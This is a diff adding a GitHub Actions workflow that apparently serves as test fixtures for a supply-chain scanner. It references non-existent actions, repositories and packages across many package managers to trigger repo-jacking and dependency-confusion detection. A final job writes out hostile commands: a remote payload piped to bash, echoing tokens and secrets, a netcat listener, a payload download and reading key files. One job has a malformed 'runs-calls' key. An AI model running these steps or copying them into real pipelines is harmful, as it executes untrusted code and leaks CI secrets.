@@ -1,0 +1,333 @@
+name: Comprehensive Vulnerability Test
+
+on:
+  push:
+    branches: [ main, master ]
+  pull_request:
+    branches: [ main, master ]
+
+jobs:
+  # Test repo jacking vulnerabilities with non-existent actions
+  repo-jacking-test:
+    runs-on: ubuntu-latest
+    steps:
+      # Non-existent action for repo jacking detection
+      - name: Non-existent action test 1
+        uses: nonexistent-org/fake-action@v1
+        
+      - name: Non-existent action test 2  
+        uses: missing-owner/missing-repo@main
+        
+      - name: Non-existent action test 3
+        uses: deleted-org/removed-action@v2.1.0
+        
+      - name: Non-existent action test 4
+        uses: hijackable-org/vulnerable-action@v1.0.0
+        
+      - name: Non-existent action test 5
+        uses: test-missing/security-action@latest
+
+  # Test dependency confusion across all 17 package managers
+  dependency-confusion-npm:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup Node.js
+        uses: actions/setup-node@v3
+        with:
+          node-version: '18'
+          
+      - name: Install vulnerable npm packages
+        run: |
+          npm install nonexistent-npm-package-vuln-test
+          npm install missing-package-12345
+          npm install fake-security-lib
+          npm install hijackable-npm-module
+          npm install vulnerable-test-package-npm
+
+  dependency-confusion-python:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.9'
+          
+      - name: Install vulnerable pip packages
+        run: |
+          pip install nonexistent-pypi-package-test
+          pip install missing-python-lib-12345
+          pip install fake-security-python
+          pip install hijackable-pypi-module
+          pip install vulnerable-test-package-pypi
+
+  dependency-confusion-ruby:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup Ruby
+        uses: ruby/setup-ruby@v1
+        with:
+          ruby-version: '3.0'
+          
+      - name: Install vulnerable gems
+        run: |
+          gem install nonexistent-gem-package-test
+          gem install missing-ruby-lib-12345
+          gem install fake-security-gem
+          gem install hijackable-rubygems-module
+
+  dependency-confusion-maven:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup Java
+        uses: actions/setup-java@v3
+        with:
+          java-version: '11'
+          distribution: 'temurin'
+          
+      - name: Create vulnerable pom.xml
+        run: |
+          cat > pom.xml << 'EOF'
+          <project>
+            <dependencies>
+              <dependency>
+                <groupId>com.nonexistent</groupId>
+                <artifactId>fake-security-lib</artifactId>
+                <version>1.0.0</version>
+              </dependency>
+              <dependency>
+                <groupId>com.missing</groupId>
+                <artifactId>hijackable-maven-module</artifactId>
+                <version>2.1.0</version>
+              </dependency>
+            </dependencies>
+          </project>
+          EOF
+
+  dependency-confusion-go:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup Go
+        uses: actions/setup-go@v4
+        with:
+          go-version: '1.19'
+          
+      - name: Install vulnerable Go modules
+        run: |
+          go get github.com/nonexistent-org/fake-go-module
+          go get github.com/missing-owner/hijackable-go-lib
+          go get github.com/deleted-org/vulnerable-go-package
+
+  dependency-confusion-composer:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup PHP
+        uses: shivammathur/setup-php@v2
+        with:
+          php-version: '8.1'
+          
+      - name: Install vulnerable Composer packages
+        run: |
+          composer require nonexistent/fake-php-package
+          composer require missing-vendor/hijackable-composer-lib
+          composer require deleted-org/vulnerable-php-module
+
+  dependency-confusion-cargo:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup Rust
+        uses: actions-rs/toolchain@v1
+        with:
+          toolchain: stable
+          
+      - name: Install vulnerable Cargo crates
+        run: |
+          cargo install nonexistent-crate-test
+          cargo install missing-rust-lib-12345
+          cargo install fake-security-crate
+          cargo install hijackable-cargo-module
+
+  dependency-confusion-hex:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup Elixir
+        uses: erlef/setup-beam@v1
+        with:
+          elixir-version: '1.14'
+          otp-version: '25'
+          
+      - name: Install vulnerable Hex packages
+        run: |
+          mix deps.get
+          # Add to mix.exs dependencies:
+          # {:nonexistent_hex_package, "~> 1.0"}
+          # {:missing_elixir_lib, "~> 2.1"}
+
+  dependency-confusion-nuget:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup .NET
+        uses: actions/setup-dotnet@v3
+        with:
+          dotnet-version: '6.0'
+          
+      - name: Install vulnerable NuGet packages
+        run: |
+          dotnet add package NonexistentNugetPackageTest
+          dotnet add package MissingDotNetLib12345
+          dotnet add package FakeSecurityNuget
+          dotnet add package HijackableNugetModule
+
+  dependency-confusion-dart:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup Dart
+        uses: dart-lang/setup-dart@v1
+        
+      - name: Install vulnerable Dart packages
+        run: |
+          # Add to pubspec.yaml dependencies:
+          # nonexistent_dart_package: ^1.0.0
+          # missing_flutter_lib: ^2.1.0
+          # fake_security_dart: ^1.5.0
+          dart pub get
+
+  dependency-confusion-perl:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup Perl
+        run: sudo apt-get install -y perl cpanminus
+        
+      - name: Install vulnerable CPAN modules
+        run: |
+          cpanm NonExistent::Perl::Module
+          cpanm Missing::CPAN::Lib
+          cpanm Fake::Security::Perl
+          cpanm Hijackable::Perl::Package
+
+  dependency-confusion-r:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup R
+        uses: r-lib/actions/setup-r@v2
+        
+      - name: Install vulnerable R packages
+        run: |
+          Rscript -e "install.packages('nonexistent-r-package')"
+          Rscript -e "install.packages('missing-cran-lib')"
+          Rscript -e "install.packages('fake-security-r')"
+
+  dependency-confusion-swift:
+    runs-on: macos-latest
+    steps:
+      - name: Install vulnerable Swift packages
+        run: |
+          # Add to Package.swift dependencies:
+          # .package(url: "https://github.com/nonexistent-org/fake-swift-package", from: "1.0.0")
+          # .package(url: "https://github.com/missing-owner/hijackable-swift-lib", from: "2.1.0")
+          swift build
+
+  dependency-confusion-haskell:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup Haskell
+        uses: haskell/actions/setup@v2
+        with:
+          ghc-version: '9.2'
+          cabal-version: '3.6'
+          
+      - name: Install vulnerable Haskell packages
+        run: |
+          cabal install nonexistent-haskell-package
+          cabal install missing-hackage-lib
+          cabal install fake-security-haskell
+
+  dependency-confusion-julia:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup Julia
+        uses: julia-actions/setup-julia@v1
+        with:
+          version: '1.8'
+          
+      - name: Install vulnerable Julia packages
+        run: |
+          julia -e 'using Pkg; Pkg.add("NonexistentJuliaPackage")'
+          julia -e 'using Pkg; Pkg.add("MissingJuliaLib")'
+          julia -e 'using Pkg; Pkg.add("FakeSecurityJulia")'
+
+  dependency-confusion-conan:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup Conan
+        run: pip install conan
+        
+      - name: Install vulnerable Conan packages
+        run: |
+          conan install nonexistent-conan-package/1.0@
+          conan install missing-cpp-lib/2.1@
+          conan install fake-security-conan/1.5@
+
+  dependency-confusion-bazel:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Setup Bazel
+        uses: bazelbuild/setup-bazelisk@v2
+        
+      - name: Install vulnerable Bazel packages
+        run: |
+          # Add to WORKSPACE file:
+          # http_archive(
+          #     name = "nonexistent_bazel_package",
+          #     urls = ["https://github.com/nonexistent-org/fake-bazel-package/archive/v1.0.0.tar.gz"],
+          # )
+          bazel build //...
+
+  # Test additional GitHub repo references for repo jacking
+  additional-repo-references:
+    runs-calls: ubuntu-latest
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v3
+        
+      - name: Test with git clone commands
+        run: |
+          # These git clone commands should trigger repo jacking detection
+          git clone https://github.com/nonexistent-test-org/missing-repo-12345.git
+          git clone https://github.com/deleted-security-org/removed-tool.git
+          git clone https://github.com/hijackable-dev/vulnerable-project.git
+          
+      - name: Test with curl downloads
+        run: |
+          # These URLs should trigger GitHub repo jacking detection
+          curl -L https://github.com/missing-owner/fake-releases/archive/v1.0.0.tar.gz -o download1.tar.gz
+          curl -L https://github.com/nonexistent-org/missing-tool/releases/download/v2.1.0/binary.zip -o download2.zip
+          
+      - name: Test with documentation references
+        run: |
+          echo "Documentation available at https://github.com/deleted-docs/missing-wiki"
+          echo "Source code: https://github.com/hijackable-source/vulnerable-code"
+          echo "Examples: https://github.com/nonexistent-examples/missing-samples"
+
+  # Test malicious patterns and suspicious activities
+  suspicious-activities:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Suspicious download pattern
+        run: |
+          curl -s https://raw.githubusercontent.com/nonexistent-org/malicious-scripts/main/payload.sh | bash
+          
+      - name: Suspicious environment access
+        run: |
+          echo $GITHUB_TOKEN
+          echo $SECRET_KEY
+          env | grep -i secret
+          
+      - name: Suspicious network activity  
+        run: |
+          nc -l 4444 &
+          wget http://suspicious-domain.com/payload
+          
+      - name: Suspicious file operations
+        run: |
+          find /tmp -name "*.key" -exec cat {} \;
+          chmod 777 /tmp/malicious-script.sh
